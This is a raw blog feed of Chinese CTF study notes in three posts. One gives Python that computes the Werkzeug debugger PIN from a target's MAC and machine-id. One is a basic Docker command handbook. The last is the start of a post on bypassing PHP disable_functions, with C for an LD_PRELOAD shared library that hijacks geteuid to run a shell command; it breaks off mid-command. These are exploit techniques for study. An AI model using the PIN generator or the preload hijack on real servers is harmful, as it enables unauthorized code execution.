class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctf&#x27;</span>,<span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br>private_bits = [<br>    <span class="hljs-string">&#x27;2485378088963&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span><br>    <span class="hljs-comment">#&#x27;1cc402dd0e11d5ae18db04a6de87223de165314a1bad2fe10cdaf5e4ac669bfd132d7d6b3ef6e7076348552f1ff9581f&#x27;# /etc/machine-id+/proc/self/cgroup</span><br>    <span class="hljs-string">&#x27;1cc402dd0e11d5ae18db04a6de87223d5b6686e20b1edaae52d72ab6d777ca76276c20e437a70ef311979d5ee636807b&#x27;</span><br>]<br>h = hashlib.sha1()  <span class="hljs-comment"># 通过读/site-packages/werkzeug/debug/__init__.py可以知道，题目环境是用sha1的</span><br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><span class="hljs-comment">#h.update(b&#x27;shittysalt&#x27;)</span><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><span class="hljs-built_in">print</span>(rv)<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204202310109.png" alt="image-20220420231009043"></p><p>老版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> getpass<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br>username=getpass.getuser() <br>app = Flask(__name__)<br>modname=<span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">&quot;__module__&quot;</span>, app.__class__.__module__)<br>mod = sys.modules.get(modname)<br><br>probably_public_bits = [<br>    username, <span class="hljs-comment">#用户名 一般为root或者读下/etc/passwd</span><br>    modname,  <span class="hljs-comment">#一般固定为flask.app</span><br>    <span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="hljs-comment">#固定，一般为Flask</span><br>    <span class="hljs-built_in">getattr</span>(mod, <span class="hljs-string">&quot;__file__&quot;</span>, <span class="hljs-literal">None</span>),    <span class="hljs-comment">#flask库下app.py的绝对路径，可以通过报错信息得到</span><br>]<br>mac =<span class="hljs-string">&#x27;02:42:ac:0c:ac:28&#x27;</span>.replace(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>mac=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(mac,base=<span class="hljs-number">16</span>))<br>private_bits = [<br>mac,<br> <span class="hljs-string">&quot;机器码&quot;</span><br> ]<br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&quot;cookiesalt&quot;</span>)<br><br>cookie_name = <span class="hljs-string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br><span class="hljs-comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span><br><span class="hljs-comment"># end up with the same value and generate out 9 digits</span><br>num=<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&quot;pinsalt&quot;</span>)<br>    num = (<span class="hljs-string">&quot;%09d&quot;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br><span class="hljs-comment"># Format the pincode in groups of digits for easier remembering if</span><br><span class="hljs-comment"># we don&#x27;t have a result yet.</span><br>rv=<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&quot;-&quot;</span>.join(<br>                num[x : x + group_size].rjust(group_size, <span class="hljs-string">&quot;0&quot;</span>)<br>                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>            )<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br>    <span class="hljs-built_in">print</span>(rv)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker手册</title>
    <link href="/2022/04/18/Docker%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8C%97/"/>
    <url>/2022/04/18/Docker%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>内容不会很深，写点平时我可能用到的</p></blockquote><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>Docker 包括三个基本概念:</p><ul><li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</li><li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li><li><strong>仓库（Repository）</strong>：仓库可看成一个代码控制中心，用来保存镜像。</li></ul><p>关于容器和镜像可以用面向对象的思想 镜像是类，而容器是镜像的实例。</p><h3 id="安装Docker-amp-Docker-Compose"><a href="#安装Docker-amp-Docker-Compose" class="headerlink" title="安装Docker&amp;Docker-Compose"></a>安装Docker&amp;Docker-Compose</h3><blockquote><p>kali安装</p></blockquote><ol><li>换源</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">vim /etc/apt/sources.list<br>deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<br><span class="hljs-meta">#</span><span class="bash">替换为清华源</span><br>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade &amp;&amp; apt-get clean<br><span class="hljs-meta">#</span><span class="bash">升级软件包，更新依赖关系，并删除所有已下载包文件</span><br></code></pre></td></tr></table></figure><ol start="2"><li>安装Docker</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common -y<br><span class="hljs-meta">#</span><span class="bash">安装相关依赖</span><br>curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add<br>sudo add-apt-repository \<br>   &quot;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian \<br><span class="hljs-meta">   $</span><span class="bash">(lsb_release -cs) \</span><br><span class="bash">   stable<span class="hljs-string">&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-string">添加软件仓库</span></span><br>vim /etc/apt/sources.list.d/docker.list<br>deb https://mirrors.aliyun.com/docker-ce/linux/debian wheezy stable<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-string">换源</span></span><br>apt-get update<br>apt-cache policy docker-ce*<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-string">更新数据库</span></span><br>apt-get install dockerbash<br></code></pre></td></tr></table></figure><ol start="3"><li>安装Docker-Compose</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get install docker-compose<br></code></pre></td></tr></table></figure><h2 id="Docker-镜像操作"><a href="#Docker-镜像操作" class="headerlink" title="Docker 镜像操作"></a>Docker 镜像操作</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker images   #列出本地主机上的镜像<br>参数 -a 列出所有镜像<br><span class="hljs-meta">#</span><span class="bash"> 解释</span><br>REPOSITORY      # 镜像的仓库<br>TAG             # 镜像的标签<br>IMAGE ID        # 镜像的ID<br>CREATED         # 镜像的创建时间<br>SIZE            # 镜像的大小<br></code></pre></td></tr></table></figure><h3 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h3><p>使用<code>docker search</code>搜索一个php的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search php<br><span class="hljs-meta"> #</span><span class="bash"> 解释</span><br>NAME            # 镜像仓库源的名称<br>DESCRIPTION  # 镜像的描述<br>OFFICIAL #是否 docker 官方发布<br>stars   #类似 Github 里面的 star。<br>AUTOMATED  # 自动构建。<br></code></pre></td></tr></table></figure><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><p>默认从Docker Hub拉取，如果不指定版本，会拉取最新版</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull nginx<br><span class="hljs-attribute">docker</span> pull nginx:<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">0</span>   #指定版本<br></code></pre></td></tr></table></figure><p>E## 删除镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker  rm $(IMAGE-ID)<br>eg: docker  rm 605c77e624dd<br></code></pre></td></tr></table></figure><h3 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h3><p>首先准备一个Dockerfile 具体含义后面再说</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> python:<span class="hljs-number">3.6</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="bash"> /app</span><br><span class="hljs-keyword">ADD</span><span class="bash"> . /app</span><br><span class="hljs-keyword">RUN</span><span class="bash"> pip install --upgrade pip</span><br><span class="hljs-keyword">RUN</span><span class="bash"> pip install  flask</span><br><br><span class="hljs-keyword">COPY</span><span class="bash"> ./app /app</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8001</span><br><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;python&quot;</span>,<span class="hljs-string">&quot;app/app.py&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>随后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"> docker build -t flask .<br><span class="hljs-meta">#</span><span class="bash">解释</span><br>    -t #指定要创建的目标镜像名<br>    .  #Dockerfile 文件所在目录，可以指定Dockerfile 的绝对路径<br></code></pre></td></tr></table></figure><h2 id="Docker-容器操作"><a href="#Docker-容器操作" class="headerlink" title="Docker 容器操作"></a>Docker 容器操作</h2><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it ubuntu /bin/bash   <br><span class="hljs-meta">#</span><span class="bash">解释</span><br>i#交互式操作<br>t #伪终端<br>ubuntu #镜像名<br>docker run -itd ubuntu<br><span class="hljs-meta">#</span><span class="bash"> </span><br>d  #后台运行<br></code></pre></td></tr></table></figure><h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">exit            # 直接退出容器并关闭<br>Ctrl + P + Q    # 容器不关闭退出<br></code></pre></td></tr></table></figure><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rm -f 容器id                       # 删除指定容器<br>docker rm -f $(docker ps -aq)       # 删除所有容器<br>docker ps -a -q|xargs docker rm -f  # 删除所有的容器<br></code></pre></td></tr></table></figure><h3 id="容器基操"><a href="#容器基操" class="headerlink" title="容器基操"></a>容器基操</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker start 容器id           # 启动容器<br>docker restart 容器id         # 重启容器<br>docker stop 容器id            # 停止当前正在运行的容器<br>docker kill 容器id            # 强制停止当前的容器<br></code></pre></td></tr></table></figure><h3 id="容器日志"><a href="#容器日志" class="headerlink" title="容器日志"></a>容器日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ocker logs -tf --tail number 容器id<br></code></pre></td></tr></table></figure><h3 id="容器拷贝操作"><a href="#容器拷贝操作" class="headerlink" title="容器拷贝操作"></a>容器拷贝操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker cp 容器id:容器内路径    本地路径<br></code></pre></td></tr></table></figure><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>指令含义</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> <span class="hljs-comment">#基础镜像，当前新镜像是基于哪个镜像的</span><br><span class="hljs-keyword">MAINTAINER</span> <span class="hljs-comment">#镜像维护者的姓名混合邮箱地址</span><br><span class="hljs-keyword">RUN</span><span class="bash"> <span class="hljs-comment">#容器构建时需要运行的命令</span></span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-comment">#当前容器对外保留出的端口</span><br><span class="hljs-keyword">WORKDIR</span><span class="bash"> <span class="hljs-comment">#指定在创建容器后，终端默认登录的进来工作目录，一个落脚点</span></span><br><span class="hljs-keyword">ENV</span> <span class="hljs-comment">#用来在构建镜像过程中设置环境变量</span><br><span class="hljs-keyword">ADD</span><span class="bash"> <span class="hljs-comment">#将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</span></span><br><span class="hljs-keyword">COPY</span><span class="bash"> <span class="hljs-comment">#类似ADD,拷贝文件和目录到镜像中！</span></span><br><span class="hljs-keyword">VOLUME</span><span class="bash"> <span class="hljs-comment">#容器数据卷，用于数据保存和持久化工作</span></span><br><span class="hljs-keyword">CMD</span><span class="bash"> <span class="hljs-comment">#指定一个容器启动时要运行的命令，dockerFie中可以有多个CMD指令，但只有最后一个生效！</span></span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> <span class="hljs-comment">#指定一个容器启动时要运行的命令！和CMD一样</span></span><br><span class="hljs-keyword">ONBUILD</span> <span class="hljs-comment">#当构建一个被继承的DockerFile时运行命令，父镜像在被子镜像继承后，父镜像的ONBUILD被触发</span><br><br></code></pre></td></tr></table></figure><p>启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build -f dockerfile地址 -t 新镜像名字:TAG .<br>docker run -it 新镜像名字:TAG<br></code></pre></td></tr></table></figure><p>补充的一点 <code>docker-compose</code> 指令</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">restart:</span> always:服务挂了自动重启<br><span class="hljs-symbol">networks:</span>如果没有配置network，会把所有镜像单独配置在<span class="hljs-keyword">default</span>网络中<br><span class="hljs-symbol">build:</span> ./nginx:从nginx目录里面去build<br><span class="hljs-symbol">internal:</span><span class="hljs-literal">true</span>  不出网<br></code></pre></td></tr></table></figure><p>拓展资料：<a href="https://blog.csdn.net/weixin_42823014/article/details/123711067">https://blog.csdn.net/weixin_42823014/article/details/123711067</a></p><p><strong>命令整合</strong></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-comment"># Advance use </span><br>docker ps -f <span class="hljs-string">&quot;status=exited&quot;</span>                                   <span class="hljs-comment">#显示所有退出的容器</span><br>docker ps -a -q                                                <span class="hljs-comment">#显示所有容器id</span><br>docker ps -f <span class="hljs-string">&quot;status=exited&quot;</span> -q                                <span class="hljs-comment">#显示所有退出容器的id</span><br>docker restart $(docker ps -q)                                 <span class="hljs-comment">#重启所有正在运行的容器</span><br>docker stop $(docker ps -a -q)                                 <span class="hljs-comment">#停止所有容器</span><br>docker rm $(docker ps -a -q)                                   <span class="hljs-comment">#删除所有容器</span><br>docker rm $(docker ps -f <span class="hljs-string">&quot;status=exited&quot;</span> -q)                   <span class="hljs-comment">#删除所有退出的容器</span><br>docker rm $(docker stop $(docker ps -a -q))                    <span class="hljs-comment">#停止并删除所有容器</span><br>docker start $(docker ps -a -q)                                <span class="hljs-comment">#启动所有容器</span><br>docker rmi $(docker images -a -q)                              <span class="hljs-comment">#删除所有镜像</span><br>docker exec -it $&#123;CONTAINER NAME/ID&#125; /bin/bash                 <span class="hljs-comment">#进入容器内</span><br>docker exec -it $&#123;CONTAINER NAME/ID&#125; ping $&#123;CONTAINER NAME/ID&#125; <span class="hljs-comment">#一个容器ping另外一个容器</span><br>docker top $&#123;CONTAINER NAME/ID&#125;                                <span class="hljs-comment">#显示一个容器的top信息</span><br>docker stats                                                   <span class="hljs-comment">#显示容器统计信息(正在运行)</span><br>    docker stats -a                                            <span class="hljs-comment">#显示所有容器的统计信息(包括没有运行的)</span><br>    docker stats -a --no-stream                                <span class="hljs-comment">#显示所有容器的统计信息(包括没有运行的) ，只显示一次</span><br>    docker stats --no-stream | sort -k8 -h                     <span class="hljs-comment">#统计容器信息并以使用流量作为倒序</span><br>docker system <br>      docker system df           <span class="hljs-comment">#显示硬盘占用</span><br>      docker system events       <span class="hljs-comment">#显示容器的实时事件</span><br>      docker system info         <span class="hljs-comment">#显示系统信息</span><br>      docker system prune        <span class="hljs-comment">#清理文件</span><br></code></pre></td></tr></table></figure><h2 id="Docker-安全问题"><a href="#Docker-安全问题" class="headerlink" title="Docker 安全问题"></a>Docker 安全问题</h2><h3 id="安全风险"><a href="#安全风险" class="headerlink" title="安全风险"></a>安全风险</h3><p><a href="http://wiki.teamssix.com/CloudNative/Docker/docker-risks.html">http://wiki.teamssix.com/CloudNative/Docker/docker-risks.html</a></p><h3 id="安全漏洞"><a href="#安全漏洞" class="headerlink" title="安全漏洞"></a>安全漏洞</h3><p><a href="http://wiki.teamssix.com/CloudNative/Docker/docker-escape-vulnerability-summary.html">http://wiki.teamssix.com/CloudNative/Docker/docker-escape-vulnerability-summary.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP bypass disable_function之道</title>
    <link href="/2022/04/13/PHP-bypass-disable-function%E4%B9%8B%E9%81%93/"/>
    <url>/2022/04/13/PHP-bypass-disable-function%E4%B9%8B%E9%81%93/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>​    菜鸡之前Bypass disable_function一直用的蚁剑插件，偶然发现ctfhub上了很多相关的题目，找时间做一下。主要是自己记笔记用，觉得不太明白可以去看参考文章</p></blockquote><center><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204132055902.png" width=170 height=170></center><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>​    LD_PRELOAD是Linux中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号。即可以通过重定向共享库函数来进行运行时修复。这项技术可用于绕过反调试代码，也可以用作用户机rootkit。</p><p>相关依赖安装  （docker 测试 所以步骤多</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">apt install -y sendmail<br>apt-get install php7.4<br>apt-get install binutils #readelf组件在这个包里<br></code></pre></td></tr></table></figure><p>可利用函数</p><ul><li>putenv()</li><li>error_log()</li><li>mail()</li></ul><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204132211863.png" alt="image-20220413221140790"></p><p>简单看看 mail 函数 可以看到 sendmail 函数调用了很多标准库函数</p><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span>        </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span> </span><br> <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span></span>&#123;<br>system(<span class="hljs-string">&quot;tac /flag &gt; 1.txt&quot;</span>);<br>&#125;   <br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">geteuid</span><span class="hljs-params">()</span></span>&#123;   <span class="hljs-comment">//这里getuid 可替换为其他标准库函数</span><br>    <span class="hljs-keyword">if</span>(getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>        unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>        payload();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>生成恶意so文件   （Linux环境下编译 &#x3D;&gt; ELF &#x3D;&gt; 服务器可利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -shared -fPIC sendmail.c -o 